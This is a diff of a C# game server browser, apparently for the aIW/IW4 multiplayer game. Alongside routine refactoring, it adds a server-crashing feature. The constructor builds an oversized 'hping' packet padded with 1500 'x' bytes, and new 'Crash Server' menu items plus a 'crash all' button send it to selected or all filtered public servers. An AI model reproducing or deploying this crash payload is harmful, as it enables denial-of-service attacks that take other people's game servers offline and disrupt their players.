@@ -1,56 +1,78 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Collections;
+using System.Collections.Generic;
 using System.ComponentModel;
-using System.Data;
+using System.Diagnostics;
 using System.Drawing;
+using System.IO;
 using System.Linq;
-using System.Text;
-using System.Windows.Forms;
 using System.Net;
 using System.Net.Sockets;
-using System.Threading;
-using System.Diagnostics;
-using System.IO;
-using Intelectix.Windows.Forms;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Net.NetworkInformation;
-    
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+using Intelectix.Windows.Forms;
+using Microsoft.VisualBasic;
+using Server_Parser_3.Forms;
+using ThreadState = System.Threading.ThreadState;
+
 namespace Server_Parser_3
 {
     public partial class Form1 : Form
     {
         #region Variables
-        private ListViewSortManager m_sortMgr;
-        private ListViewSortManager m_sortMgr2;
+
+        private static byte[] _getinfoCrash;
+        public static List<Server> _searchServers = new List<Server>();
+        private readonly List<Server> _filteredServers = new List<Server>();
+        private readonly Dictionary<string, string> _gameType = new Dictionary<string, string>();
+        private readonly byte[] _getinfo;
+        private readonly byte[] _getstatus;
+        private readonly List<Server> _infoServers = new List<Server>();
+        private readonly Dictionary<string, string> _mapNames = new Dictionary<string, string>();
+        private readonly List<Server> _respondedServers = new List<Server>();
+        private readonly List<Thread> _runningThreads = new List<Thread>();
+        private readonly List<Server> _servers = new List<Server>();
+        private readonly Queue _updateQueue = new Queue(2000);
+        private readonly ListViewSortManager m_sortMgr;
+        private readonly ListViewSortManager m_sortMgr2;
+        private bool _abort;
+        private bool _autoretry;
+        private bool _favourites;
+        private Filter _filter;
+        private byte[] _hping = {0xFF, 0xFF, 0xFF, 0XFF, 0x30, 0x68, 0x70, 0x69, 0x6e, 0x67};
+        private int _queryDone;
+        private int _version = 7;
         private ListViewSortManager m_sortMgr3;
         private ListViewSortManager m_sortMgr4;
-        Dictionary<string, string> _mapNames = new Dictionary<string, string>();
-        Dictionary<string, string> _gameType = new Dictionary<string, string>();
-        List<Server> _servers = new List<Server>();
-        List<Server> _respondedServers = new List<Server>();
-        List<Server> _infoServers = new List<Server>();
-        int _queryDone = 0;
-        byte[] _getstatus;
-        byte[] _getinfo;
-        delegate void InvokeDelegate(object data);
-        delegate void ListViewDelegate(string[] data);
-        delegate string ControlTextDelegate(object control, ControlType type);
-        Thread queryCheck;
-        bool _favourites = false;
-        ListViewItem selectedItem;
-        Queue _updateQueue = new Queue(2000);
-        Filter _filter = new Filter();
-        int _version = 6;
-        List<Thread> _runningThreads = new List<Thread>();
-        bool _abort = false;
-        public static List<Server> _searchServers = new List<Server>();
-        byte[] _hping = { 0xFF, 0xFF, 0xFF, 0XFF, 0x30, 0x68, 0x70, 0x69, 0x6e, 0x67 };
-        bool _autoretry = false;
+
+        private Thread queryCheck;
+        private ListViewItem selectedItem;
+
+        #region Nested type: ControlTextDelegate
+
+        private delegate string ControlTextDelegate(object control, ControlType type);
+
+        #endregion
+
+        #region Nested type: InvokeDelegate
+
+        private delegate void InvokeDelegate(object data);
+
+        #endregion
+
+        #region Nested type: ListViewDelegate
+
+        private delegate void ListViewDelegate(string[] data);
+
+        #endregion
+
         #endregion
 
         #region Form Methods
+
         public Form1()
         {
             InitializeComponent();
@@ -60,35 +82,52 @@ namespace Server_Parser_3
             _getinfo = Encoding.UTF8.GetBytes("    getinfo");
             for (int i = 0; i < 4; i++)
                 _getinfo[i] = 0xFF;
+            var writer = new BinaryWriter(new MemoryStream());
+            var reader = new BinaryReader(writer.BaseStream);
+            writer.Write(new byte[] {0xFF, 0xFF, 0xFF, 0xFF});
+            writer.Write("0hping ".ToCharArray());
+            for (int i = 0; i < 1500; i++)
+                writer.Write('x');
+            reader.BaseStream.Position = 0; 
+            _getinfoCrash = reader.ReadBytes((int) reader.BaseStream.Length);
             populateVariables();
-            m_sortMgr = new ListViewSortManager(listViewServer, new Type[] {
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewIPSort),
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewPlayerSort),
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewInt32Sort) });
-            m_sortMgr2 = new ListViewSortManager(listViewFav, new Type[] {
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewIPSort),
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewPlayerSort),
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewInt32Sort) });
-            m_sortMgr3 = new ListViewSortManager(listViewPlayers, new Type[] {
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewInt32Sort),
-                typeof(ListViewInt32Sort) });
-            m_sortMgr4 = new ListViewSortManager(listViewDvars, new Type[] {
-                typeof(ListViewTextCaseInsensitiveSort),
-                typeof(ListViewTextCaseInsensitiveSort) });
-            new Thread(new ThreadStart(checkNewest)).Start();
+            m_sortMgr = new ListViewSortManager(listViewServer, new[]
+                                                                    {
+                                                                        typeof (ListViewTextCaseInsensitiveSort),
+                                                                        typeof (ListViewIPSort),
+                                                                        typeof (ListViewTextCaseInsensitiveSort),
+                                                                        typeof (ListViewPlayerSort),
+                                                                        typeof (ListViewTextCaseInsensitiveSort),
+                                                                        typeof (ListViewTextCaseInsensitiveSort),
+                                                                        typeof (ListViewInt32Sort)
+                                                                    });
+            m_sortMgr2 = new ListViewSortManager(listViewFav, new[]
+                                                                  {
+                                                                      typeof (ListViewTextCaseInsensitiveSort),
+                                                                      typeof (ListViewIPSort),
+                                                                      typeof (ListViewTextCaseInsensitiveSort),
+                                                                      typeof (ListViewPlayerSort),
+                                                                      typeof (ListViewTextCaseInsensitiveSort),
+                                                                      typeof (ListViewTextCaseInsensitiveSort),
+                                                                      typeof (ListViewInt32Sort)
+                                                                  });
+            m_sortMgr3 = new ListViewSortManager(listViewPlayers, new[]
+                                                                      {
+                                                                          typeof (ListViewTextCaseInsensitiveSort),
+                                                                          typeof (ListViewInt32Sort),
+                                                                          typeof (ListViewInt32Sort)
+                                                                      });
+            m_sortMgr4 = new ListViewSortManager(listViewDvars, new[]
+                                                                    {
+                                                                        typeof (ListViewTextCaseInsensitiveSort),
+                                                                        typeof (ListViewTextCaseInsensitiveSort)
+                                                                    });
+            new Thread(checkNewest).Start();
             //Log.Initialize("serverparser3.log", LogLevel.All, true);
             Log.Debug("getinfo : " + Encoding.UTF8.GetString(_getinfo));
             Log.Debug("getstatus : " + Encoding.UTF8.GetString(_getstatus));
         }
+
         private void refreshBtn_Click(object sender, EventArgs e)
         {
             clearVariables();
@@ -98,18 +137,19 @@ namespace Server_Parser_3
             if (tabControl1.SelectedIndex == 0)
             {
                 Log.Info("Starting to query master server");
-                toolStripStatusLabel1.Text = "Querying master server";
+                statusLabel.Text = "Querying master server";
                 _favourites = false;
                 backgroundWorker1.RunWorkerAsync(true);
             }
             else
             {
                 Log.Info("Starting to query favourites");
-                toolStripStatusLabel1.Text = "Querying favourite servers";
+                statusLabel.Text = "Querying favourite servers";
                 _favourites = true;
                 backgroundWorker1.RunWorkerAsync(false);
             }
         }
+
         private void stopBtn_Click(object sender, EventArgs e)
         {
             refreshBtn.Enabled = true;
@@ -118,6 +158,7 @@ namespace Server_Parser_3
             _abort = true;
             Log.Info("Stop button pressed");
         }
+
         private void clearVariables()
         {
             listViewServer.Items.Clear();
@@ -132,7 +173,9 @@ namespace Server_Parser_3
             _filter = new Filter();
             _abort = false;
             _searchServers.Clear();
+            _filteredServers.Clear();
         }
+
         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
         {
             /*_abort = true;
@@ -140,6 +183,7 @@ namespace Server_Parser_3
             Environment.Exit(1337);
             Process.GetCurrentProcess().Kill();*/
         }
+
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             _abort = true;
@@ -148,6 +192,7 @@ namespace Server_Parser_3
             Environment.Exit(1337);
             //Process.GetCurrentProcess().Kill();
         }
+
         private void listViewServer_MouseDown(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
@@ -157,28 +202,33 @@ namespace Server_Parser_3
                     cmsServers.Show(this, e.X, e.Y);
             }
         }
+
         private void listViewServer_SelectedIndexChanged(object sender, EventArgs e)
         {
-            var items = listViewServer.SelectedItems;
+            ListView.SelectedListViewItemCollection items = listViewServer.SelectedItems;
             if (items.Count > 0)
             {
                 selectedItem = items[0];
-                var server = getServer(selectedItem.SubItems[1].Text.Split(':')[0], int.Parse(selectedItem.SubItems[1].Text.Split(':')[1]), false, true);
+                Server server = getServer(selectedItem.SubItems[1].Text.Split(':')[0],
+                                          int.Parse(selectedItem.SubItems[1].Text.Split(':')[1]), false, true);
                 //if (server.Dvars != null)
-                    displayData(server);
+                displayData(server);
             }
         }
+
         private void listViewFav_SelectedIndexChanged(object sender, EventArgs e)
         {
-            var items = listViewFav.SelectedItems;
+            ListView.SelectedListViewItemCollection items = listViewFav.SelectedItems;
             if (items.Count > 0)
             {
                 selectedItem = items[0];
-                var server = getServer(selectedItem.SubItems[1].Text.Split(':')[0], int.Parse(selectedItem.SubItems[1].Text.Split(':')[1]), false, true);
+                Server server = getServer(selectedItem.SubItems[1].Text.Split(':')[0],
+                                          int.Parse(selectedItem.SubItems[1].Text.Split(':')[1]), false, true);
                 //if (server.Dvars != null)
-                    displayData(server);
+                displayData(server);
             }
         }
+
         private void displayData(Server server)
         {
             listViewPlayers.Items.Clear();
@@ -187,24 +237,27 @@ namespace Server_Parser_3
                 return;
             foreach (var pair in server.Dvars)
             {
-                var item = listViewDvars.Items.Add(pair.Key);
+                ListViewItem item = listViewDvars.Items.Add(pair.Key);
                 item.SubItems.Add(pair.Value);
             }
-            foreach (var player in server.Players)
+            foreach (Player player in server.Players)
             {
-                var item = listViewPlayers.Items.Add(removeQuakeColorCodes(player.Name));
+                ListViewItem item = listViewPlayers.Items.Add(removeQuakeColorCodes(player.Name));
                 item.SubItems.Add(player.Score.ToString());
                 item.SubItems.Add(player.Ping.ToString());
             }
         }
+
         private void Form1_Load(object sender, EventArgs e)
         {
-            PropertyInfo aProp = typeof(ListView).GetProperty("DoubleBuffered", BindingFlags.NonPublic | BindingFlags.Instance);
+            PropertyInfo aProp = typeof (ListView).GetProperty("DoubleBuffered",
+                                                               BindingFlags.NonPublic | BindingFlags.Instance);
             aProp.SetValue(listViewDvars, true, null);
             aProp.SetValue(listViewServer, true, null);
             aProp.SetValue(listViewPlayers, true, null);
             aProp.SetValue(listViewFav, true, null);
         }
+
         private void listViewFav_MouseDown(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
@@ -215,7 +268,7 @@ namespace Server_Parser_3
                     toolStripMenuItem1.Enabled = true;
                     toolStripMenuItem2.Enabled = true;
                     toolStripMenuItem3.Enabled = true;
-                    toolStripMenuItem4.Enabled = true;
+                    //toolStripMenuItem4.Enabled = true;
                     toolStripMenuItem5.Enabled = true;
                     searchPlayerToolStripMenuItem.Enabled = true;
                     rCONToolToolStripMenuItem1.Enabled = true;
@@ -226,7 +279,7 @@ namespace Server_Parser_3
                     toolStripMenuItem1.Enabled = false;
                     toolStripMenuItem2.Enabled = false;
                     toolStripMenuItem3.Enabled = false;
-                    toolStripMenuItem4.Enabled = false;
+                    //toolStripMenuItem4.Enabled = false;
                     toolStripMenuItem5.Enabled = false;
                     searchPlayerToolStripMenuItem.Enabled = false;
                     rCONToolToolStripMenuItem1.Enabled = false;
@@ -234,29 +287,48 @@ namespace Server_Parser_3
                 }
             }
         }
+
+        private void btnCrashAll_Click(object sender, EventArgs e)
+        {
+            if (_filteredServers.Count > 0)
+            {
+                foreach (Server server in _filteredServers)
+                {
+                    statusLabel.Text = "Crashing " + server.IP + ":" + server.Port;
+                    crashServer(server.IP + ":" + server.Port);
+                }
+                statusLabel.Text = "Crashing complete.";
+            }
+        }
+
         #endregion
 
         #region Context Menu Strips/Form Events
+
         private void addToFavouritesToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (selectedItem != null)
                 writeFav(selectedItem.SubItems[1].Text, false);
         }
+
         private void connectToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (selectedItem != null)
-                new Thread(new ParameterizedThreadStart(connectIP)).Start(new string[] { selectedItem.SubItems[1].Text, selectedItem.SubItems[3].Text });
+                new Thread(connectIP).Start(new[] {selectedItem.SubItems[1].Text, selectedItem.SubItems[3].Text});
         }
+
         private void iPToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (selectedItem != null)
                 Clipboard.SetDataObject(selectedItem.SubItems[1].Text);
         }
+
         private void hostNameToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (selectedItem != null)
                 Clipboard.SetDataObject(selectedItem.SubItems[0].Text);
         }
+
         private void toolStripMenuItem2_Click(object sender, EventArgs e)
         {
             if (selectedItem != null)
@@ -272,7 +344,7 @@ namespace Server_Parser_3
         private void toolStripMenuItem4_Click(object sender, EventArgs e)
         {
             if (selectedItem != null)
-                new Thread(new ParameterizedThreadStart(connectIP)).Start(new string[] { selectedItem.SubItems[1].Text, selectedItem.SubItems[3].Text });
+                new Thread(connectIP).Start(new[] {selectedItem.SubItems[1].Text, selectedItem.SubItems[3].Text});
         }
 
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
@@ -283,12 +355,14 @@ namespace Server_Parser_3
                 refreshBtn_Click(this, null);
             }
         }
+
         private void listViewServer_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            if (e.Button == MouseButtons.Left)
+            /*if (e.Button == MouseButtons.Left)
                 if (selectedItem != null)
-                    new Thread(new ParameterizedThreadStart(connectIP)).Start(new string[] { selectedItem.SubItems[1].Text, selectedItem.SubItems[3].Text });
+                    new Thread(connectIP).Start(new[] {selectedItem.SubItems[1].Text, selectedItem.SubItems[3].Text});*/
         }
+
         private void listViewServer_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.C && e.Control)
@@ -297,12 +371,14 @@ namespace Server_Parser_3
                 e.Handled = true;
             }
         }
+
         private void listViewFav_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            if (e.Button == MouseButtons.Left)
+            /*if (e.Button == MouseButtons.Left)
                 if (selectedItem != null)
-                    new Thread(new ParameterizedThreadStart(connectIP)).Start(new string[] {selectedItem.SubItems[1].Text, selectedItem.SubItems[3].Text });
+                    new Thread(connectIP).Start(new[] {selectedItem.SubItems[1].Text, selectedItem.SubItems[3].Text});*/
         }
+
         private void listViewFav_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.C && e.Control)
@@ -311,145 +387,178 @@ namespace Server_Parser_3
                 e.Handled = true;
             }
         }
+
         private void addIPToFavouritesToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            var IP = Microsoft.VisualBasic.Interaction.InputBox("Please enter a IP that is in the following format :\nIP:Port\nHostnames will work", "aIW Server Parser 3", "", this.Location.X, this.Location.Y);
+            string IP =
+                Interaction.InputBox(
+                    "Please enter a IP that is in the following format :\nIP:Port\nHostnames will work",
+                    "aIW Server Parser 3", "", Location.X, Location.Y);
             if (IP != "" && IP.Split(':').Length == 2)
             {
                 writeFav(IP, false);
                 refreshBtn_Click(this, null);
             }
         }
+
         private void listViewPlayers_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.C && e.Control)
             {
                 if (listViewPlayers.SelectedItems.Count > 0)
                 {
-                    var selected = listViewPlayers.SelectedItems[0];
-                    Clipboard.SetDataObject(selected.SubItems[0].Text + " - " + selected.SubItems[1].Text + " - " + selected.SubItems[2].Text + "ms");
+                    ListViewItem selected = listViewPlayers.SelectedItems[0];
+                    Clipboard.SetDataObject(selected.SubItems[0].Text + " - " + selected.SubItems[1].Text + " - " +
+                                            selected.SubItems[2].Text + "ms");
                     e.Handled = true;
                 }
             }
         }
+
         private void listViewDvars_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.C && e.Control)
             {
                 if (listViewDvars.SelectedItems.Count > 0)
                 {
-                    var selected = listViewDvars.SelectedItems[0];
+                    ListViewItem selected = listViewDvars.SelectedItems[0];
                     Clipboard.SetDataObject(selected.SubItems[0].Text + " = \"" + selected.SubItems[1].Text + "\"");
                     e.Handled = true;
                 }
             }
         }
+
         private void searchPlayerToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             _searchServers = _respondedServers;
             (new frmSearchPlayer()).ShowDialog();
         }
+
         private void searchPlayerToolStripMenuItem_Click(object sender, EventArgs e)
         {
             _searchServers = _respondedServers;
             (new frmSearchPlayer()).ShowDialog();
         }
+
         private void rCONToolToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            var frm = new Forms.frmRcon();
+            var frm = new frmRcon();
             frm.IP = selectedItem.SubItems[1].Text;
             frm.Show();
         }
+
         private void rCONToolToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            var frm = new Forms.frmRcon();
+            var frm = new frmRcon();
             frm.IP = selectedItem.SubItems[1].Text;
             frm.Show();
         }
+
+        private void crashServerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (selectedItem != null)
+                crashServer(selectedItem.SubItems[1].Text);
+        }
+
+        private void crashServerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            if (selectedItem != null)
+                crashServer(selectedItem.SubItems[1].Text);
+        }
+
         #endregion
 
         #region Parse List
+
         private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
         {
-            var masterserver = (bool)e.Argument;
+            var masterserver = (bool) e.Argument;
             if (masterserver)
             {
                 var EP = new IPEndPoint(IPAddress.Any, 0);
-                var getservers = Encoding.UTF8.GetBytes("    getservers IW4 142 full empty");
+                byte[] getservers = Encoding.UTF8.GetBytes("    getservers IW4 61586 full empty");
+                //byte[] getservers = Encoding.UTF8.GetBytes("    getservers IW4 142 full empty");
                 for (int i = 0; i < 4; i++)
                     getservers[i] = 0xFF;
                 Log.Debug("getservers : " + Encoding.UTF8.GetString(getservers));
-                
-                UdpClient client = new UdpClient("server.alteriw.net", 20810);
+
+                //var client = new UdpClient("master.alter-solution.com", 20810);
+                var client = new UdpClient("iw4.prod.fourdeltaone.net", 20810);
                 client.Client.ReceiveTimeout = 2000;
                 client.Send(getservers, getservers.Length);
                 while (true)
                 {
                     try
                     {
-                        var receivedata = client.Receive(ref EP);
-                        if (EP.Address.ToString() == "94.23.19.48")
-                        {
-                            Log.Debug("Received data from master server\n" + Encoding.UTF8.GetString(receivedata));
-                            parseResponse(receivedata);
-                            if (Encoding.UTF8.GetString(receivedata).Contains("EOT"))
-                                break;
-                        }
+                        byte[] receivedata = client.Receive(ref EP);
+                        //if (EP.Address.ToString() == "94.23.19.48")
+                        //if (EP.Address.ToString() == "89.165.202.219")
+                        //{
+                        Log.Debug("Received data from master server\n" + Encoding.UTF8.GetString(receivedata));
+                        parseResponse(receivedata);
+                        if (Encoding.UTF8.GetString(receivedata).Contains("EOT"))
+                            break;
+                        //}
                     }
-                    catch { Log.Error(e.ToString()); break; }
+                    catch
+                    {
+                        Log.Error(e.ToString());
+                        break;
+                    }
                 }
             }
             else
                 readFav();
         }
+
         private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
         {
-            toolStripStatusLabel1.Text = "Querying servers";
+            statusLabel.Text = "Querying servers";
             progressBar.Maximum = _servers.Count;
-            toolStripStatusLabel1.Text = string.Format("Queried 0 out of {0} servers", _servers.Count);
+            statusLabel.Text = string.Format("Queried 0 out of {0} servers", _servers.Count);
             //listViewServer.BeginUpdate();
             Log.Info(string.Format("Started to query {0} servers", _servers.Count));
-            Thread thread = new Thread(new ThreadStart(startQuery));
+            var thread = new Thread(startQuery);
             thread.Start();
             _runningThreads.Add(thread);
             stopBtn.Enabled = true;
             stopBtn.Visible = true;
         }
+
         private void parseResponse(byte[] data)
         {
-            var strData = Encoding.UTF7.GetString(data).Substring(4).Split('\\');
+            string[] strData = Encoding.UTF7.GetString(data).Substring(4).Split('\\');
             for (int i = 0; i < strData.Length; i++)
             {
                 if (strData[i].Contains("serverresponse"))
                     continue;
-                else if (strData[i].Contains("EOT"))
+                if (strData[i].Contains("EOT"))
                     break;
-                else
+                var ip = new int[6];
+                int port = 0;
+                if (strData[i] != "")
                 {
-                    var ip = new int[6];
-                    var port = 0;
-                    if (strData[i] != "")
+                    if (strData[i].Length == 6)
                     {
-                        if (strData[i].Length == 6)
-                        {
-                            for (int h = 0; h < strData[i].Length; h++)
-                                ip[h] = (int)strData[i][h];
-                            port = (256 * ip[4] + ip[5]);
-                            Server server = new Server(string.Format("{0}.{1}.{2}.{3}", ip[0], ip[1], ip[2], ip[3]), port);
-                            _servers.Add(server);
-                        }
+                        for (int h = 0; h < strData[i].Length; h++)
+                            ip[h] = strData[i][h];
+                        port = (256*ip[4] + ip[5]);
+                        var server = new Server(string.Format("{0}.{1}.{2}.{3}", ip[0], ip[1], ip[2], ip[3]), port);
+                        _servers.Add(server);
                     }
-                    if (strData[i] == "")
-                        strData[i + 1] = strData[i] + "\\" + strData[i + 1];
                 }
+                if (strData[i] == "")
+                    strData[i + 1] = strData[i] + "\\" + strData[i + 1];
             }
         }
+
         #endregion
 
         #region Query Servers
+
         private void startQuery()
         {
-            Filter filter = new Filter();
+            var filter = new Filter();
             filter.ServerName = getControlText(nameFilter, ControlType.Textbox);
             filter.Empty = emptyFilter.Checked;
             filter.Full = fullFilter.Checked;
@@ -460,26 +569,27 @@ namespace Server_Parser_3
             filter.PlayerName = getControlText(playerFilter, ControlType.Textbox);
             filter.v03 = v03Filter.CheckState;
             _filter = filter;
-            queryCheck = new Thread(new ParameterizedThreadStart(checkQuery));
+            queryCheck = new Thread(checkQuery);
             queryCheck.Start(false);
             _runningThreads.Add(queryCheck);
-            var update = new Thread(new ThreadStart(checkUpdateQueue));
+            var update = new Thread(checkUpdateQueue);
             update.Start();
             _runningThreads.Add(update);
-            foreach (var server in _servers)
+            foreach (Server server in _servers)
             {
                 if (_abort)
                     return;
-                Thread query = new Thread(new ParameterizedThreadStart(getStatus));
+                var query = new Thread(getStatus);
                 //Thread query = new Thread(new ParameterizedThreadStart(getInfo));
                 query.Start(server);
                 _runningThreads.Add(query);
             }
         }
+
         private void getStatus(object arg)
         {
-            var server = (Server)arg;
-            var failed = 0;
+            var server = (Server) arg;
+            int failed = 0;
             var EP = new IPEndPoint(IPAddress.Any, 0);
             while (true)
             {
@@ -489,23 +599,26 @@ namespace Server_Parser_3
                 {
                     if (_favourites)
                     {
-                        var queue = Queue.Synchronized(_updateQueue);
-                        queue.Enqueue(prepareItem(new Server(server.IP, server.Port, new List<Player>(), new Dictionary<string, string>(), new Dictionary<string, string>(), 999), true));
+                        Queue queue = Queue.Synchronized(_updateQueue);
+                        queue.Enqueue(
+                            prepareItem(
+                                new Server(server.IP, server.Port, new List<Player>(), new Dictionary<string, string>(),
+                                           new Dictionary<string, string>(), 999), true));
                     }
                     break;
                 }
-                UdpClient client = new UdpClient();
+                var client = new UdpClient();
                 client.Client.ReceiveTimeout = 1000;
                 client.Client.SendTimeout = 1000;
                 client.Client.ExclusiveAddressUse = false;
                 try
                 {
                     client.Connect(server.IP, server.Port);
-                    var now = DateTime.Now;
+                    DateTime now = DateTime.Now;
                     client.Send(_getstatus, _getstatus.Length);
-                    var data = Encoding.UTF8.GetString(client.Receive(ref EP));
-                    Log.Debug(EP.ToString() + " returned getstatus request\n" + data);
-                    parseQuery(data, EP.Address.ToString() + ":" + EP.Port.ToString(), (DateTime.Now - now).Milliseconds);
+                    string data = Encoding.UTF8.GetString(client.Receive(ref EP));
+                    Log.Debug(EP + " returned getstatus request\n" + data);
+                    parseQuery(data, EP.Address + ":" + EP.Port.ToString(), (DateTime.Now - now).Milliseconds);
                     break;
                 }
                 catch (Exception e)
@@ -522,11 +635,11 @@ namespace Server_Parser_3
             }
             _queryDone++;
         }
-        
+
         private void getInfo(object arg)
         {
-            var server = (Server)arg;
-            var failed = 0;
+            var server = (Server) arg;
+            int failed = 0;
             var EP = new IPEndPoint(IPAddress.Any, 0);
             while (true)
             {
@@ -534,18 +647,18 @@ namespace Server_Parser_3
                     return;
                 if (failed >= 5)
                     break;
-                UdpClient client = new UdpClient();
+                var client = new UdpClient();
                 client.Client.ReceiveTimeout = 1000;
                 client.Client.SendTimeout = 1000;
                 client.Client.ExclusiveAddressUse = false;
                 try
                 {
                     client.Connect(server.IP, server.Port);
-                    var now = DateTime.Now;
+                    DateTime now = DateTime.Now;
                     client.Send(_getinfo, _getinfo.Length);
-                    var data = Encoding.UTF8.GetString(client.Receive(ref EP));
-                    Log.Debug(EP.ToString() + " returned getinfo request\n" + data);
-                    parseQuery(data, EP.Address.ToString() + ":" + EP.Port.ToString(), (DateTime.Now - now).Milliseconds);
+                    string data = Encoding.UTF8.GetString(client.Receive(ref EP));
+                    Log.Debug(EP + " returned getinfo request\n" + data);
+                    parseQuery(data, EP.Address + ":" + EP.Port.ToString(), (DateTime.Now - now).Milliseconds);
                     break;
                 }
                 catch (Exception e)
@@ -561,18 +674,19 @@ namespace Server_Parser_3
                 failed++;
             }
         }
+
         private HPong hping(Server server)
         {
-            var failed = 0;
+            int failed = 0;
             var EP = new IPEndPoint(IPAddress.Any, 0);
-            HPong returned = new HPong();
+            var returned = new HPong();
             while (true)
             {
                 if (_abort)
                     return returned;
                 if (failed >= 5)
                     break;
-                UdpClient client = new UdpClient();
+                var client = new UdpClient();
                 client.Client.ReceiveTimeout = 1000;
                 client.Client.SendTimeout = 1000;
                 client.Client.ExclusiveAddressUse = false;
@@ -580,10 +694,10 @@ namespace Server_Parser_3
                 {
                     client.Connect(server.IP, server.Port);
                     client.Send(_getinfo, _getinfo.Length);
-                    var data = Encoding.UTF8.GetString(client.Receive(ref EP));
-                    Log.Debug(EP.ToString() + " returned hping request\n" + data);
+                    string data = Encoding.UTF8.GetString(client.Receive(ref EP));
+                    Log.Debug(EP + " returned hping request\n" + data);
 
-                    var data2 = data.Split(' ');
+                    string[] data2 = data.Split(' ');
                     returned.InGame = (data2[3] == "1");
                     returned.CurrentPlayers = int.Parse(data2[4]);
                     returned.MaxPlayers = int.Parse(data2[5]);
@@ -602,18 +716,19 @@ namespace Server_Parser_3
             }
             return returned;
         }
+
         private void parseQuery(string data, string ip, int ping)
         {
-            var strData = data.Substring(4).Split('\n');
+            string[] strData = data.Substring(4).Split('\n');
             if (strData[0].StartsWith("disconnect"))
-                throw new System.ArgumentException("Data is disconnect!");
+                throw new ArgumentException("Data is disconnect!");
             else if (string.IsNullOrEmpty(strData[0]))
-                throw new System.ArgumentNullException("Data is empty!");
+                throw new ArgumentNullException("Data is empty!");
             else if (strData[0].StartsWith("statusResponse"))
             {
-                var dvars = GetParams(strData[1].Split('\\'));
-                var players = getPlayers(strData);
-                Server server = new Server();
+                Dictionary<string, string> dvars = GetParams(strData[1].Split('\\'));
+                List<Player> players = getPlayers(strData);
+                var server = new Server();
                 server.IP = ip.Split(':')[0];
                 server.Port = int.Parse(ip.Split(':')[1]);
                 server.Players = players;
@@ -626,8 +741,8 @@ namespace Server_Parser_3
             else if (strData[0].StartsWith("infoResponse"))
             {
                 Queue queue = Queue.Synchronized(_updateQueue);
-                var dvars = GetParams(strData[1].Split('\\'));
-                var server = getServer(ip.Split(':')[0], int.Parse(ip.Split(':')[1]), true, false);
+                Dictionary<string, string> dvars = GetParams(strData[1].Split('\\'));
+                Server server = getServer(ip.Split(':')[0], int.Parse(ip.Split(':')[1]), true, false);
                 if (string.IsNullOrEmpty(server.IP))
                     return;
                 server.InfoDvars = dvars;
@@ -637,46 +752,59 @@ namespace Server_Parser_3
                     server.Ping = ping;
                 _infoServers.Add(server);
                 if (checkFilter(server))
+                {
                     //addItem(prepareItem(server));
+                    _filteredServers.Add(server);
                     queue.Enqueue(prepareItem(server, false));
+                }
             }
         }
+
         #endregion
 
         #region Check Filters
+
         private bool checkFilter(Server server)
         {
-            var dvars = server.Dvars;
-            var info = server.InfoDvars;
-            var players = server.Players;
-            var namefilter = _filter.ServerName;//getControlText(nameFilter, ControlType.Textbox);
-            var mapfilter = _filter.Map;//getControlText(mapFilter, ControlType.Combobox);
-            var typefilter = _filter.GameType;//getControlText(typeFilter, ControlType.Combobox);
-            var playerfilter = _filter.PlayerName;//getControlText(playerFilter, ControlType.Textbox);
-            var modfilter = _filter.Mod;//getControlText(modFilter, ControlType.Combobox);
+            Dictionary<string, string> dvars = server.Dvars;
+            Dictionary<string, string> info = server.InfoDvars;
+            List<Player> players = server.Players;
+            string namefilter = _filter.ServerName; //getControlText(nameFilter, ControlType.Textbox);
+            string mapfilter = _filter.Map; //getControlText(mapFilter, ControlType.Combobox);
+            string typefilter = _filter.GameType; //getControlText(typeFilter, ControlType.Combobox);
+            string playerfilter = _filter.PlayerName; //getControlText(playerFilter, ControlType.Textbox);
+            string modfilter = _filter.Mod; //getControlText(modFilter, ControlType.Combobox);
             if (removeQuakeColorCodes(dvars["sv_hostname"]).ToUpper().IndexOf(namefilter.ToUpper()) > -1)
                 if (_mapNames[mapfilter] == dvars["mapname"] || mapfilter == "Any")
                     if (_gameType[typefilter] == dvars["g_gametype"] || typefilter == "Any")
                         if (containsPlayer(players, playerfilter))
                             if (isHardcore(dvars["g_hardcore"], _filter.HC))
-                                if (checkFull(info["clients"], getTrueMaxClients(new string[] { getValue(info, "shortversion"), dvars["sv_maxclients"], dvars["sv_privateClients"] } ), _filter.Full))
+                                if (checkFull(info["clients"],
+                                              getTrueMaxClients(new[]
+                                                                    {
+                                                                        getValue(info, "shortversion"),
+                                                                        dvars["sv_maxclients"], dvars["sv_privateClients"]
+                                                                    }),
+                                              _filter.Full))
